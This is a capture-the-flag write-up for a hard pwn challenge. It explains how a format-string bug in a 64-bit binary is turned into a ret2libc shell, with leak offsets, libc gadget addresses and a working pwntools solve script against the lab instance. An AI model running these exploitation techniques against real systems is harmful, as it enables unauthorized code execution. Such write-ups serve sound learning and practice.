# Echo — PentestGarage (Pwn, Hard, 300)

**Flag:** `ctf{__redacted__}` *(solved; value removed for public repo)*

**Target:** `172.31.45.248:32428` (lab instance, per-session)
**Binary:** `vuln` — ELF 64-bit PIE, x86-64, dynamically linked, **not stripped**.
BuildID `efca7cd44adc765689b2271f394c522567c1e45c`.
**Mitigations:** Full RELRO (BIND_NOW), Stack Canary, NX, PIE — GOT read-only.

## Vulnerability
`vuln()` (0x1278):
```c
char buf[0x410];
read(0, buf, 0x3ff);
printf(buf);          // format string bug — user controls the format
```
Only ONE printf; program then returns through main -> exit. `.init_array` runs
`setup()` (unbuffers IO, SIGALRM->bye/exit, alarm(30)).

Gift: the compiler stashes a **pointer to vuln's saved return address** at
`[rbp-0x418]` (= `rbp+8`). That pointer sits at printf arg position **`%7$`**.
The user buffer begins at **`%8$`**.

## Key format-string offsets (found by leaking)
- `%3$p`  = `__libc_start_main_ret` (libc leak; offset 0x111142 in this libc)
- `%7$p`  = `&retaddr` (pointer to vuln's return address)  -> write primitive
- `%8$`   = first qword of our buffer
- `%139$p`= vuln's return address value (= pie_base + 0x130b) -> PIE leak

## Exploit strategy (single connection)
1. **Loop primitive.** `AAAAAA%7$hhn` prints 6 chars then writes 6 to the return
   address low byte (`0x0b -> 0x06`), redirecting vuln's `ret` to `call vuln`
   (pie+0x1306). Program loops -> infinite format-string I/O in one connection.
2. **Leak.** libc base = `%3$p` - 0x111142; `&retaddr` = `%7$p`.
   Fingerprinted via GOT `%s` reads -> **glibc 2.31-0ubuntu9.x**.
3. **Arbitrary write (fully positional).** Wrote the ROP chain over the return
   address region with a hand-rolled byte writer: literal filler chars for the
   count + `%<pos>$hhn` referencing pointers embedded in the buffer.
4. **ret2libc.** `[pop rdi; ret][/bin/sh][system]` at `[ra],[ra+8],[ra+16]`.
   No loop this time -> vuln returns into the chain -> `system("/bin/sh")`.

## CRITICAL gotchas (why the "obvious" version fails)
- **glibc rejects mixed positional/sequential specifiers.** `%<width>c%N$hn` and
  pwntools' default `fmtstr_payload` output (`%144c%13$hhn`) silently do NOT write
  on this glibc. Also `%N$<width>c` (positional width) fails when there are gaps in
  referenced args. ONLY **literal-char count + positional `%N$hhn`** works reliably.
- **`[ra+16]` top bytes are runtime garbage**, so write full/needed bytes, don't
  assume zeros.
- **system stack alignment.** Entering `system` via `ret` leaves `rsp % 16 == 0`,
  but glibc expects `== 8` (as a real `call` would). Result: `movaps` crash.
  Fix: pad the chain with a `ret` gadget so `system` entry `rsp % 16 == 8`.
  (`&retaddr % 16 == 8` here, so chain length must be EVEN -> prepend one `ret`.)

## libc 2.31-0ubuntu9.x offsets used
- `__libc_start_main_ret` 0x111142
- `system` 0x55410 | `str_bin_sh` 0x1b75aa
- `pop rdi ; ret` 0x26b72 | `ret` 0x25679

## Solve scripts
`fpb.py` (fully-positional byte writer) + `pwn_shell.py` (driver). Core:
```python
from pwn import *
from fpb import fp_bytes, qbytes   # literal filler + %N$hhn, embedded pointers
LSM_RET=0x111142; POP_RDI=0x26b72; BINSH=0x1b75aa; SYSTEM=0x55410; RET=0x25679
r=remote('172.31.45.248',32428)
r.send(b'AAAAAA%7$hhn>>%3$p|%7$p<<')          # loop + leak
lsm,ra=[int(x,16) for x in r.recvrepeat(1).split(b'>>')[1].split(b'<<')[0].split(b'|')]
libc=lsm-LSM_RET
chain=[libc+POP_RDI, libc+BINSH, libc+SYSTEM]
while (ra+8*len(chain))%16!=8: chain=[libc+RET]+chain   # system rsp%16==8
w={}; [w.update(qbytes(ra+8*i,v)) for i,v in enumerate(chain)]
r.send(fp_bytes(w,res=0x280))                 # write chain, no loop -> ret into it
r.sendline(b'cat /flag'); print(r.recvrepeat(2))
```

## Tooling (Windows analysis)
No objdump/gdb; used Python `capstone`+`pyelftools` to reverse, `pwntools` (4.15.0,
installed with `--only-binary :all:` to skip the failing `unicorn` build) for
remote I/O + gadget search, and libc.rip to fingerprint/download the libc.
